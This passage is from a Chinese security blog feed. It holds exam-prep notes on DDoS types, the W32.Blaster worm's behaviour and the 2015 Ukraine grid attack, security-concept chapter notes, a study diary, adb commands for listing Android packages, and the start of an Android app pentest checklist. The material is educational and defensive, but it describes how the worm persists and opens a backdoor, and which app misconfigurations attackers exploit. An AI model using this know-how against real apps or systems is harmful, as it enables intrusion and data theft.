Flood 攻击：利用僵尸主机向特定目标网站发送大量的 HTTP GET 请求，以导致网站瘫痪</li><li>SYN Flood 攻击：击利用 TCP&#x2F;IP 协议的安全缺陷，伪造主机发送大量的 SYN 包到目标系统，导致目标系统的计算机网络瘫痪</li><li>DNS 放大攻击：攻击者假冒目标系统向多个 DNS 解析服务器发送大量请求，而导致 DNS解析服务器同时应答目标系统，产生大量网络流量，形成拒绝服务</li></ul><h2 id="W32-Blaster-Worm"><a href="#W32-Blaster-Worm" class="headerlink" title="W32.Blaster.Worm"></a>W32.Blaster.Worm</h2><p>W32.Blaster.Worm 是一种利用 DCOM RPC 漏洞进行传播的网络蠕虫，其传播能力很强。感染蠕虫的计算机系统运行不稳定，系统会不断重启。并且该蠕虫还将对 windowsupdate.com<br>进行拒绝服务攻击，使得受害用户不能及时地得到这个漏洞的补丁。</p><p>当W32.Blaster.Worm 运行时，会进行以下操作：<br>(1) 创建一个名为 BILLY 的互斥体。如果这个互斥体存在，蠕虫将放弃感染并退出。<br>(2) 在注册表中添加下列键值：”windows auto update”&#x3D;”msblast.exe” ，并且将其添加至：HKEY LOCAL MACHINE\SOFTWARE\Microsoft\Windows\Current Version\Run ，这样就可以使蠕虫在系统被重起的时候能够自动运行。<br>(3) 蠕虫生成攻击 IP 地址列表，尝试去感染列表中的计算机，蠕虫对有 DCOMRPC 漏洞的机器发起 TCP 135 端口的连接，进行感染。<br>(4) TCP 4444 端口绑定一个 cmd.exe 的后门。<br>(5) UDP port69 口上进行监听。如果收到了一个请求，将把 Msblast.exe 发送给目标机器。<br>(6) 发送命令给远端的机器使它回联已经受到感染的机器并下载 Msblast.exe<br>(7) 检查当前日期及月份，若当前日期为 16 日或以后，或当前月份处在 月到 12 月之间，W32.Blaster Worm 蠕虫将对 windowsupdate.com 发动 TCP 同步风暴拒绝服务攻击</p><h2 id="网络安全导致停电事件"><a href="#网络安全导致停电事件" class="headerlink" title="网络安全导致停电事件"></a>网络安全导致停电事件</h2><p>本网络安全事件材料来源于北京安天网络安全技术有限公司（以下简称安天公司）发布的<br>《乌克兰电力系统遭受攻击事件综合分析报告》及相关网络信息。<br>2015.12.23 日，乌克兰多地区发生同时停电的事件。调查显示，乌克兰电厂停电是因网络攻击导致电力基础设施被破坏。<br>黑客首先利用钓鱼邮件，欺骗电力公司员工下载了带有 BlackEnergy 的恶意代码文件，然后诱导用户打开这个文件，激活木马，安装 SSH后门和系统自毁工具 Killdisk, 致使黑客最终获得了主控电脑的控制权。最后，黑客远程操作恶意代码将电力公司的主控计算机与变电站断连并切断电源；同时，黑客发动 DDoS 攻击电力客服中心，致使电厂工作人员无法立即进行电力维修工作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第1章：网络信息安全概述</title>
      <link href="/chapter1-information-security-overview/"/>
      <url>/chapter1-information-security-overview/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>备考合集：<a href="https://jenchoi.tk/information-security-engineer">2023软考-信息安全工程师</a></strong></p></blockquote><h1 id="本章分析"><a href="#本章分析" class="headerlink" title="本章分析"></a>本章分析</h1><ul><li>分值：选择题2-3分，案例题6分</li><li>重点<ul><li>1.3 网络信息安全属性(CIA)</li><li>1.4 网络信息安全功能</li></ul></li></ul><h1 id="定义、现状"><a href="#定义、现状" class="headerlink" title="定义、现状"></a>定义、现状</h1><p>网络发展现状：<strong>数字化、网络化、智能化</strong>成为信息社会的主要特征，”万物互联”时代已经来临。</p><ul><li>狭义上的网络信息安全特指网络信息系统的各组成要素符合安全属性的要求，即<strong>机密性、完整性、可用性、抗抵赖性、可控性</strong></li><li>广义上的网络信息安全是涉及国家安全、城市安全、经济安全、社会安全、生产安全、人身安全等在内的”大安全“</li></ul><h1 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h1><p>围绕网络安全问题，保障网络信息安全的对象内容、理念方法、持续时间都在不断演变，其新的变化表现为三个方面</p><ul><li>一是保障内容从<strong>单维度向多维度</strong>转变，保障的维度包含网络空间域、物理空间域、社会空间域</li><li>二是网络信息安全保障措施<strong>从单一性（技术） 向综合性</strong>（法律、政策、技术、管理、产业、教育）演变</li><li>三是保障时间维度要求<strong>涵盖网络系统的整个生命周期</strong>，保障响应速度要求不断缩短，网络信息安全没有战时、平时之分，而是时时刻刻</li></ul><h1 id="法律法规"><a href="#法律法规" class="headerlink" title="法律法规"></a>法律法规</h1><p><strong>2016 年</strong>国家发布了《国家网络空间安全战略》，相关的网络安全法律法规政政策也相继出台<br>《中华人民共和国网络安全法》已于 <strong>2017 年 6 月 1日</strong>起实施。为加强网络安全教育，网络空间安全已被增设为一级学科</p><h1 id="⭐基本属性"><a href="#⭐基本属性" class="headerlink" title="⭐基本属性"></a>⭐基本属性</h1><p>常见的网络安全基本属性有<strong>机密性、完整性、可用性、抗抵赖性、可控性</strong>，此外还有真实性、时效性、合规性、隐私性、合规性、公平性、可靠性、可生存性。</p><ul><li><strong>机密性</strong>(<strong>C</strong>onfidentiality): 网络信息不泄露给非授权的用户、实体或程序，能够防止非授权者获取信息</li><li><strong>完整性</strong>(<strong>I</strong>ntegrity): 网络信息或系统未经授权不能进行更改的特性</li><li><strong>可用性</strong> (<strong>A</strong>vailability): 合法许可的用户能够及时获取网络信息或服务的特性</li><li>抗抵赖性: 防止网络信息系统相关用户否认其活动行为的特性</li><li>可控性: 是指网络信息系统责任主体对其具有管理、支配能力的属姓，能够根据授权规则对系统进行有效掌握和控制，使得管理者有效地控制系统的行为和信息的使用，符合系统运行目标<br><em><strong>机密性、完整性、可用性分别指网络信息系统 CIA 三性</strong></em></li><li>真实性：是指网络空间信息与实际物理空间、社会空间的客观事实保持一致性</li><li>时效性：是指网络空间信息、服务及系统能够满足时间约束要求</li><li>合规性：是指网络信息、服务及系统符合法律法规政策、标准规范等要求</li><li>公平性：是指网络信息系统相关主体处于同等地位处理相关任务，任何一方不占据优势的特性要求</li><li>可靠性：是指网络信息系统在规定条件及时间下，能够有效完成预定的系统功能的特性</li><li>可生存性：是指网络信息系统在安全受损的情形下，提供最小化、必要的服务功能，能够支撑业务继续运行的安全特性</li></ul><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><ul><li>宏观目标：指网络信息系统满足国家安全需求特性符合国家法律法规政策要求，如网络主权、网络合规等。</li><li>微观目标：指网络信息系统的具体安全要求。</li><li>具体目标是保障网络信息及相关信息系统免受网络安全威胁，相关保护对象满足网络安全基本属性要求，用户网络行为符合国家法律法规要求，网络信息系统能够支撑业务安全持续运营数据安全得到有效保护。</li></ul><h1 id="⭐功能"><a href="#⭐功能" class="headerlink" title="⭐功能"></a>⭐功能</h1><p>要实现网络信息安全基本目标，网络应具备<strong>防御、监测、应急和恢复</strong>等基本功能。</p><ul><li>防御：是指采取各种手段和措施，使得网络系统具备阻止、抵御各种已知网络安全威胁的功能</li><li>检测：是指采取各种手段和措施，检测、发现各种已知或未知的网络安全威胁的功能</li><li>应急：是指采取各种手段和措施，针对网络系统中的突发事件，具备及时响应和处置网络攻击的功能</li><li>恢复：是指采取各种手段和措施，针对已经发生的网络灾害事件，具备恢复网络系统运行的功能</li></ul><h1 id="基本技术要求"><a href="#基本技术要求" class="headerlink" title="基本技术要求"></a>基本技术要求</h1><ul><li>物理环境安全：是指包括环境、设备和记录介质在内的所有支接网络系统运行的硬件的总体安全，是网络系统安全、可靠、不间断运行的基本保证。物理安全需求主要包括环境安全、设备安全、存储介质安全</li><li>安全认证：是实现网络资源访问控制的前提和依据,是有效保护网络管理对象的重要技术方法。网络认证的作用是标识鉴别网络资源访问者的身份的真实性，防止用户假冒身份访问网络资源。</li><li>访问控制：是有效保护网络管理对象，使其免受威胁的关键技术方法。其目标主要有两个<ul><li>(1) 限制非法用户获取或使用网络资源</li><li>(2) 防止合法用户滥用权限，越权访问网络资源</li></ul></li><li>安全保密：网络安全保密的目的就是防止非授权的用户访问网上信息或网络设备</li><li>漏洞扫描：入侵者通常都是通过一些程序来探测网络系统中存在的安全漏洞，然后通过所发现的安全漏洞，采取相应技术进行攻击。因此，网络系统中需配备弱点或漏洞扫描系统，用以检测网络中是否存在安全漏洞，以便网络安全管理员根据漏洞检测报告，制定合适的漏洞管理方法</li><li>恶意代码防护：网络是病毒、蠕虫、特洛伊木马等恶意代码最好、最快的传播途径之一。恶意代码可以通过网上文件下载、电子邮件、网页、文件共享等传播方式进入个人计算机或服务器。因此，防范恶意代码是网络系统必不可少的安全需求。</li><li>内容安全：是指相关网络信息系统承载的信息及数据符合法律法规要求，防止不良信息及垃圾信息传播。相关网络信息内容安全技术主要有垃圾邮件过滤、IP 地址&#x2F;URL 过滤、自然语言分析处理等</li><li>监测及预警：网络系统面临着不同级别的威胁，网络安全运行是一件复杂的工作。网络安全监测的作用在于发现综合网系统入侵活动和检查安全保护措施的有效性，以便及时报警给网络安全管理员，对入侵者采取有效措施，阻止危害扩散并调整安全策略</li><li>应急响应：网络系统所遇到的安全威胁往往难以预测，虽然采取了一些网络安全防范措施，但是由于人为或技术上的缺陷，网络信息安全事件仍然不可避免地会发生。既然网络信息安全事件不能完全消除，则必须采取一些措施来保障在出现意外的情况下，恢复网络系统的正常运转。同时，对于网络攻击行为进行电子取证，打击网络犯罪活动。</li></ul><h1 id="安全管理"><a href="#安全管理" class="headerlink" title="安全管理"></a>安全管理</h1><ul><li>定义：是指对网络资产采取合适的安全措施，以确保网络资产的可用性、完整性、可控制性和抗抵赖性等，不致因网络设备、网络通信协议、网络服务、网络管理受到人为和自然因素的危害，而导致网络中断、信息泄露或破坏。</li><li>管理对象：主要包括网络设备、网络通信协议、网络操作系统、网络服务、安全网络管理等在内的所有支持网络系统运行的软、硬件总和。网络信息安全涉及内容有物理安全、网络通信安全、操作系统安全、网络服务安全、网络操作安全以及人员安全。</li><li>管理目标：通过适当的安全防范措施，保障网络的运行安全和信息安全，满足网上业务开展的安全要求。</li><li><strong>管理方法</strong>：风险管理、等级保护、纵深防御、层次化保护、应急响应以及PDCA (Plan-Do-Check-Act) 方法等</li><li>管理要素：网络管理对象、网络威胁、网络脆弱性、网络风险、 网络保护措施<ul><li>管理对象：企业、机构直接赋予了价值而需要保护的资产。它的存在形式包括有形的和无形的，如网络设备硬件、软件文档是有形的，而服务质量、网络带宽则是无形的。</li><li>网络威胁：根据威胁主体的自然属性，可分为自然威胁和人为威胁。自然威胁有地震、雷击、洪水火灾、静电、鼠害和电力故障等。从威胁对象来分类，可分为物理安全威胁、网络通信威胁、网络服务威胁、网络管理威胁</li><li>脆弱性：计算系统中与安全策略相冲突的状态或错误，它将导致攻击者非授权访问、假冒用户执行操作及拒绝服务。CC 标准指出，脆弱性的存在将会导致风险，而威胁主体利用脆弱性产生风险。</li><li>网络风险：特定的威胁利用网络管理对象所存在的脆弱性，导致网络管理对象的价值受到损害或丢失的可能性。简单地说，网络风险就是网络威胁发生的概率和所&#x2F;造成影响的乘积。网络安全管理实际上是对网络系统中网管对象的风险进行控制</li><li>保护措施：为对付网络安全威胁，减少脆弱性，限制意外事件的影响，检测意外事件并促进灾难恢复而实施的各种实践、规程和机制的总称。</li></ul></li></ul><h1 id="安全管理流程"><a href="#安全管理流程" class="headerlink" title="安全管理流程"></a>安全管理流程</h1><ol><li>确定网络信息安全管理对象</li><li>评估网络信息安全管理对象的价值</li><li>识别网络信息安全管理对象的威胁</li><li>识别网络信息安全管理对象的脆弱性</li><li>确定网络信息安全管理对象的风险级别</li><li>制定网络信息安全防范体系及防范措施</li><li>实施和落实网络信息安全防范措施</li><li>运行&#x2F;维护网络信息安全设备、配置</li></ol><h1 id="常见安全管理评估"><a href="#常见安全管理评估" class="headerlink" title="常见安全管理评估"></a>常见安全管理评估</h1><ul><li>网络安全等级保护测评</li><li>信息安全管理体系认证(简称 ISMS)</li><li>系统安全工程能力成熟度模型(简称 SSE-CMM)</li></ul><h1 id="法律与政策文件"><a href="#法律与政策文件" class="headerlink" title="法律与政策文件"></a>法律与政策文件</h1><ul><li>《中华人民共和国网络安全法》：2017年6月1日</li><li>《中华人民共和国密码法》： 2020 年1月1日</li></ul><p>采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于<strong>六个月</strong></p><ul><li><p>等级保护的主要工作</p><ul><li>定级：确认定级对象，确定合适级别，通过专家评审和主管部门审核;</li><li>备案：按等级保护管理规定准备备案材料，到当地公安机关备案和审核</li><li>建设整改：依据相应等级要求对当前保护对象的实际情况进行差距分析，针对不符合项结合行业要求对保护对象进行整改，建设符合等级要求的安全技术和管理体系</li><li>等级测评：等级保护测评机构依据相应等级要求，对定级的保护对象进行测评并出具相应的等级保护测评证书;</li><li>运营维护工作是指等级保护运营主体按照相应等级要求，对保护对象的安全相关事宜进行监督管理。</li></ul></li><li><p>中国网络安全审查技术与认证中心（CCRC，原中国信息安全认证中心）是负责实施网络安全审查和认证的专门机构。</p></li><li><p>国家计算机网络应急技术处理协调中心（简称”国家互联网应急中心”，英文缩写为 CNCERT或 CNCERT&#x2F;CC）是中国计算机网络应急处理体系中的头单位，是国家级应急中心。CNCERT 的主要职责是：按照”积极预防、及时发现、快速响应、力保恢复”的方针，开展互联网网络安全事件的预防、发现、预警和协调处置等工作，维护公共互联网安全，保障关键信息基础役施的安全运行。</p></li></ul><h1 id="信息获取来源"><a href="#信息获取来源" class="headerlink" title="信息获取来源"></a>信息获取来源</h1><ul><li>安全会议：四大顶级学术会议S&amp;P、CCS、NDSS USENIX Security</li><li>网络安全期刊</li><li>网络安全网站</li><li>网络安全术语<ul><li>基础技术类：密码。加密(encryption)、解密(decryption)、非对称加密算法(asymmetric cryptographic algorithm)、公钥加密算法 (public key cryptographic algorithm)、公钥 (public key) 等。</li><li>风险评估技术类：拒绝服务(DeDiad of Service)、分布式拒绝服务(DstibedDenial of Service)、网页篡改 (Website Distortion)、网页仿冒 (Phishing)、网页挂马 (Website Malicious Code)、域名劫持(DNS Hijack)、路由劫持 (Routing Hijack)、网络蠕虫(Network Worm)、垃圾邮件 (Spam)、恶意代码(Malicious Code)、特洛伊木马(Trojan Horse)、僵尸网络 (Bot Net)等。</li><li>防护技术类：访问控制 (Access Control)、入侵防御系统(Intrusion Prevention System)、防火墙(Firewall)等。</li><li>检测技术类：入侵检测(Intrusion Detection)、漏洞扫描(Vulnerability Scanning)</li><li>响应恢复技术类：应急响应(Emergency Response )、灾难恢复 (Disaster Recovery)、备份(Backup)</li><li>测评技术类等：黑盒测试(Black Box Testing)、白盒测试 (White Box Testing)、灰盒测试(Gray Box Testing)、渗透测试(Penetration Testing)、模糊测试(FuzzTesting)</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软考-信息安全工程师-备考笔记</title>
      <link href="/information-security-engineer/"/>
      <url>/information-security-engineer/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2023.7.1日</p></blockquote><p>开此篇博客是为了记录自己准备软考的过程，比如：</p><ul><li>软考相关信息收集</li><li>备考笔记</li><li>一些碎碎念（想看我哔哔赖赖的请移步本文【碎碎念】part）</li></ul><p>希望2023年能顺利考下这个证书。</p><h1 id="关于软考-信息安全工程师"><a href="#关于软考-信息安全工程师" class="headerlink" title="关于软考-信息安全工程师"></a>关于软考-信息安全工程师</h1><p>1、什么是软考？<br>软考既是<strong>职业资格考试</strong>，又是<strong>职称资格考试</strong>，同时，还具有水平考试性质，是目前国内最具权威的计算机类考试，含金量最高，涉及面最广。</p><p>2、有哪些岗位<br>参考软考官网 <a href="https://www.ruankao.org.cn/platform">https://www.ruankao.org.cn/platform</a></p><p>3、科目怎么选？</p><ul><li>不建议考初级，软考可以越级考试</li><li>根据工作来选考试科目</li></ul><h2 id="含金量"><a href="#含金量" class="headerlink" title="含金量"></a>含金量</h2><p>1、职称评定。以考代评，通过即为中级职称。<br>2、积分落户。<br>3、抵扣个税。<br>4、升职加薪。<br>5、领取政府现金补贴。技能提升拿证后，即可申请领取补贴。<br>6、企业招投标加分。</p><h2 id="考试形式"><a href="#考试形式" class="headerlink" title="考试形式"></a>考试形式</h2><p>初级和中级都是考两门：</p><ul><li>基础知识（选择题：单选75题）</li><li>应用技术（问答题：4-6题）</li></ul><p>高级考三门：</p><ul><li>综合知识（选择题：单选75题）</li><li>案例分析（问答题：3题）</li><li>论文（2700字左右）</li></ul><h2 id="考试科目"><a href="#考试科目" class="headerlink" title="考试科目"></a>考试科目</h2><p>1、网络信息安全基础知识和技术</p><ul><li>150分钟（上午 9:00-11:30）</li><li>综合知识，75道选择题</li><li>75分</li></ul><p>2、网络信息安全工程与综合应用实践</p><ul><li>150分钟（下午 14:00-16:30）</li><li>案例分析，问答题，一般 4-5 道，每道试题 3-4 个问题</li><li>75分</li></ul><p><strong>官方参考书目：《信息安全工程师教程（第2版）》蒋建春主编</strong></p><h2 id="通过标准"><a href="#通过标准" class="headerlink" title="通过标准"></a>通过标准</h2><p>所有科目合格标准为试卷满分的60%(45分&#x2F;75分)合格<br>需一次性通过所有科目，考试成绩不保留</p><p>成绩查询：一般可于考试后三个月左右，登录<a href="http://www.ruankao.org.cn/">报名网站</a>进行成绩查询</p><h2 id="报名条件"><a href="#报名条件" class="headerlink" title="报名条件"></a>报名条件</h2><p>无</p><h2 id="报名时间"><a href="#报名时间" class="headerlink" title="报名时间"></a>报名时间</h2><p>软考每年有两次考试，分别安排在上半年和下半年。<br>每次考试时间略有不同，上半年考试时间为5月下旬，报名时间一般3月份开始；<br>下半年考试时间为11月上旬，报名时间一般在8月开始。<br>报名网站 <a href="https://bm.ruankao.org.cn/sign/welcome">https://bm.ruankao.org.cn/sign/welcome</a></p><h2 id="备考建议"><a href="#备考建议" class="headerlink" title="备考建议"></a>备考建议</h2><p>1、备考时间：3-5个月<br>通读一遍教材（1个月左右）——熟读教材和讲义——综合知识练习——案例分析题真题——论文写作（考前2个月）——考前冲刺。</p><p>2、需要完成的任务</p><ul><li>综合知识题库（知识点全覆盖）</li><li>历年真题练习（2016年-至今）</li><li>讲义（重点内容必看）</li><li>视频（仔细听讲+回看）</li></ul><p>3、一定要多看教材，多做题。考试会有很多概念题，还有一些分析题，这些要想全部做好，你的基础就得打牢。</p><p>4、上午题75道选择题，考试范围很广，下午题虽然是文字题，但其实每次就考那几个知识点，反而不用太担心。</p><p>5、最后冲刺阶段做几套模拟题，保证正确率在80%，基本上差不多了。</p><h2 id="证书查询"><a href="#证书查询" class="headerlink" title="证书查询"></a>证书查询</h2><p><a href="https://query.ruankao.org.cn/">https://query.ruankao.org.cn</a></p><p><a href="http://www.cpta.com.cn/certQuery.html">http://www.cpta.com.cn/certQuery.html</a></p><h1 id="备考笔记"><a href="#备考笔记" class="headerlink" title="备考笔记"></a>备考笔记</h1><h2 id="一轮：章节归纳"><a href="#一轮：章节归纳" class="headerlink" title="一轮：章节归纳"></a>一轮：章节归纳</h2><ul><li><a href="https://jenchoi.tk/chapter1-information-security-overview">第1章：网络信息安全概述</a></li><li><a href="https://jenchoi.tk/chapter2-attack-priciples-and-methods">第2章：网络攻击原理与常用方法</a></li></ul><h2 id="二轮：知识精炼"><a href="#二轮：知识精炼" class="headerlink" title="二轮：知识精炼"></a>二轮：知识精炼</h2><h2 id="三轮：冲刺总结"><a href="#三轮：冲刺总结" class="headerlink" title="三轮：冲刺总结"></a>三轮：冲刺总结</h2><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><h2 id="为什么参加软考"><a href="#为什么参加软考" class="headerlink" title="为什么参加软考"></a>为什么参加软考</h2><p>1、应届生，安全行业没啥可考的证书，NISP太过于蹩脚，CISP还不够格，其他的细分领域还有待进一步确认，软考总体上是一个不错的选择，费用低，国家性考试，含金量尚可。</p><p>2、目前时间比较充裕，与其天天追剧，不如做点对未来有益的事情。</p><p>3、听国企、体制内的一些前辈提到这个考试，说有利于评职称，虽然不知道以后会不会进国企什么的，但考下来总归是有利无害的。</p><p>4、顺便借着此次考试，看看考试和实际工作的重点有何不一样。</p><p>5、开开眼，多了解下领域内的知识。</p><p>6、一直想多考点证书，各种各样的证书，以证促学。</p><h2 id="怎么安排自己的备考计划"><a href="#怎么安排自己的备考计划" class="headerlink" title="怎么安排自己的备考计划"></a>怎么安排自己的备考计划</h2><p>我是5月份回学校忙毕业事宜的时候，决定考这个证书。查了些资料，确定了今年下午会有一场信安的考试，于是决定备考，整起来。</p><p>6月12号返岗，陆陆续续学了两章，然后忙毕业转正的事情，中途又去黄山玩了一趟，耽搁了一两周。</p><p>今天是7月1号，对于备考的计划是：</p><ul><li>7月-8月上旬：完成一轮，把知识点快速的过一遍。（本月可能比较忙，刚到新项目上，要学的比较多，加之中途有10节游泳课，所以拖到8月上旬完成）</li><li>8月-9月：练习题+二轮</li><li>10月-11月考试：做题冲刺。</li></ul><p>不安排具体的，弹性完成，总感觉这项考试不需要我备考4个多月，中间估计会做挺多其他的事。</p><h2 id="第一套真题"><a href="#第一套真题" class="headerlink" title="第一套真题"></a>第一套真题</h2><blockquote><p> 2023.7.2</p></blockquote><p>第三章都没学完，看那些概念实在头疼，于是打算从真题、练习题入手，看看考试在考什么内容，好有针对性的看看。于是把21年的真题扒出来做了下</p><p>特离谱，居然还有英文题。。。我一度怀疑网站是不是传错题目了</p><p>而且他不是简单的考你有没有看懂文章的意思，它涉及到了语法啊。</p><p>就比如说第一空肯定是authentic这个词，但是选项里有他的名词和动名词形式。</p><p>第二个也是，计算机做大量运算，哎。。。我也不知道填哪个。。。</p><p><img src="/img/image-20230702132644996.png" alt="image-20230702132644996"></p><p>更离谱的是，5错3。最终在学了3章不到的情况下，连蒙带猜打了34分</p><p><img src="/img/image-20230702132913141.png" alt="image-20230702132913141"></p><p>这一套题下来的感觉就是，我正确的题目大多是实际用到的、非概念性的。但是在一些法律法规、定义概念上，我就显得吃力，里面涉及到很多需要记忆的点，也不需要背下来，但是得熟悉，看到选项能选出来。</p>]]></content>
      
      
      <categories>
          
          <category> 自我提升 </category>
          
          <category> 考证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取安卓APP包名的方法</title>
      <link href="/how-to-obtain-app-package-name/"/>
      <url>/how-to-obtain-app-package-name/</url>
      
        <content type="html"><![CDATA[<h1 id="有apk包"><a href="#有apk包" class="headerlink" title="有apk包"></a>有apk包</h1><p><strong>手机查看方法：</strong></p><p>那肯定是用万能的MT管理器，哈哈哈哈哈</p><p>找到对应的apk包，点击查看，打开AndroidManifest文件（反编译），搜索 <code>package=</code>，后面的就是包名</p><img src="/img/image-20230701235959798.png" alt="image-20230701235959798" style="zoom:67%;" /><p><strong>电脑获取方法：</strong></p><p>和手机步骤一样，只不过要用APKTool来反编译</p><p>apkTool反编译，查看AndroidManifest文件，搜索 <code>package=</code>，后面的就是包名</p><h1 id="已安装，无apk包"><a href="#已安装，无apk包" class="headerlink" title="已安装，无apk包"></a>已安装，无apk包</h1><h2 id="无root"><a href="#无root" class="headerlink" title="无root"></a>无root</h2><p><strong>方法一：</strong></p><p>列出手机内所有apk对应的包名，一个个看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list package</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p> 需要先打开应用，再执行命令（不推荐，输出一大堆，看的眼花缭乱）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有包名</span></span><br><span class="line">adb shell dumpsys activity</span><br></pre></td></tr></table></figure><h2 id="已root"><a href="#已root" class="headerlink" title="已root"></a>已root</h2><p>&#x2F;data&#x2F;data 目录下有所有的安装包名</p><p>可以用adb切到该目录之后ls，也可以用MT管理器查看</p><p>推荐MT管理器查看，因为它会带一个应用的icon，adb比较难找</p><p><strong>参考文章</strong></p><p>1、<a href="https://www.jianshu.com/p/f6e8a03db025">获取APK包名的几种方法 - 简书</a></p><p>2、<a href="https://segmentfault.com/a/1190000040947631">爬虫 - 安卓逆向 05 app包名的获取 - 个人文章 - SegmentFault 思否</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓APP客户端渗透测试指南</title>
      <link href="/android-app-client-pentest-guide/"/>
      <url>/android-app-client-pentest-guide/</url>
      
        <content type="html"><![CDATA[<p>安卓APP的渗透测试，主要分为两个方面</p><ul><li><p><strong>客户端</strong>：安卓四大组件的安全性检测，简单来说就是一个个的检查项，看看是否符合要求</p></li><li><p><strong>服务端</strong>：APP和服务端交互的渗透测试，抓包检测，和Web渗透差不多</p></li></ul><p>本篇我们主要介绍Android客户端的渗透测试，重点放在：<strong>要测哪些项目，怎么测</strong>上面。我会一条条的列出相应的测试项，并给出在我认知内最简便的方法（如果大佬们有更好的方法，欢迎邮件与我讨论），供自己及其他同行参考。</p><h1 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h1><ul><li>dex2jar</li><li>APKTool</li><li>jd-gui：<a href="https://github.com/java-decompiler/jd-gui/releases">Releases · java-decompiler&#x2F;jd-gui</a></li></ul><h1 id="应用配置安全"><a href="#应用配置安全" class="headerlink" title="应用配置安全"></a>应用配置安全</h1><h2 id="开启AllowBackup属性"><a href="#开启AllowBackup属性" class="headerlink" title="开启AllowBackup属性"></a>开启AllowBackup属性</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>被测应用的AndroidManifest.xml文件中allowBackup属性值被设置为true，可通过adb backup对应用数据进行备份，在无root的情况下可以导出应用中存储的所有数据，造成用户数据泄露。</p><p><strong>检查工具：</strong>APKTool</p><p><strong>检查方法：</strong></p><p>1、使用APKTool对apk进行反编译（<strong>后续不再详述此步骤</strong>）</p><p>把要反编译的apk复制到APKTool目录下，cmd切到APKTool的目录</p><p>输入指令：<code>apktool.jar d test.apk</code></p><p>完成后，APKTool的目录下会多出一个和apk同名的文件夹</p><p>2、AndroidManifest.xml 文件中查看 allowBackup 属性，检查是否未设置或者被设置为true</p><blockquote><p>AndroidManifest.xml 文件在刚刚反编译出来的文件夹里</p></blockquote><p><img src="/img/image-20230701135230263.png" alt="image-20230701135230263"></p><p><strong>整改意见：</strong>将参数android:allowBackup属性设置为false，防止数据泄漏</p><h2 id="开启Debuggable属性"><a href="#开启Debuggable属性" class="headerlink" title="开启Debuggable属性"></a>开启Debuggable属性</h2><p><strong>漏洞等级：中</strong></p><p><strong>风险分析：</strong>被测应用的AndroidManifest.xml文件中Debuggable属性值被设置为true时，可以设置断点来控制程序的执行流程，在应用程序运行时修改其行为，app存在被恶意程序调试的风险，可能导致泄漏敏感信息泄漏等问题。</p><p><strong>检查工具：</strong>APKTool</p><p><strong>检查方法：</strong></p><p>1、使用APKTool对apk进行反编译</p><p>2、AndroidManifest.xml 文件中查看 Debuggable 属性，检查是否未设置或者被设置为true</p><p><img src="/img/image-20230701135254393.png" alt="image-20230701135254393"></p><p><strong>整改意见：</strong>将参数android:allowBackup属性设置为false，防止数据泄漏</p><h1 id="公共组件安全"><a href="#公共组件安全" class="headerlink" title="公共组件安全"></a>公共组件安全</h1><h2 id="WebView组件远程代码执行"><a href="#WebView组件远程代码执行" class="headerlink" title="WebView组件远程代码执行"></a>WebView组件远程代码执行</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface 方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法，导致远程代码执行漏洞。</p><p><strong>检查工具：</strong>dex2jar、jd-gui</p><p><strong>检查方法：</strong></p><p>1、解压缩apk文件（apk和zip包一样，可以直接被解压缩。改成zip后缀再解压缩也是一样的），得到其中的classes.dex</p><p>2、把classed.dex复制到 dex2jar 的目录下，cmd运行 <code>dex2jar.bat classes.dex </code>，得到 classes_dex2jar.jar</p><p>3、使用 jd-gui 打开 classes_dex2jar.jar</p><p>4、全局搜索是否使用 addJavascriptInterface 方法</p><p>5、如果是 Android 4.2 之前版本，查看源代码中是否对addJavascriptInterface的输入参数进行过滤；如果是Android 4.2及之后版本，检查是否声明@JavascriptInterface来代替addjavascriptInterface</p><p><strong>整改意见：</strong></p><p>1、不使用 addJavascriptInterface 方法</p><p>2、若必须使用，则应对访问的url进行过滤限制或对html页面进行完整性校验，同时显示移除对指定的javascript接口的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(searchBoxJavaBridge_);</span><br><span class="line">removeJavascriptInterface(accessibility);</span><br><span class="line">removeJavascriptInterface(accessibilityTraversal);</span><br></pre></td></tr></table></figure><p>3、采用@JavascriptInterface 代替 addjavascriptInterface</p><h2 id="Activity组件配置错误"><a href="#Activity组件配置错误" class="headerlink" title="Activity组件配置错误"></a>Activity组件配置错误</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Activity是安卓应用组件，提供与用户进行交互的界面，如果应用对权限控制不当，攻击者可以绕过认证阶段，直接调用后续activity组件。</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p>1、进入drozer（教程 <a href="https://jenchoi.tk/install-drozer-on-windows/">https://jenchoi.tk/install-drozer-on-windows/</a> ）</p><p>2、获取被测应用的包名（教程：<a 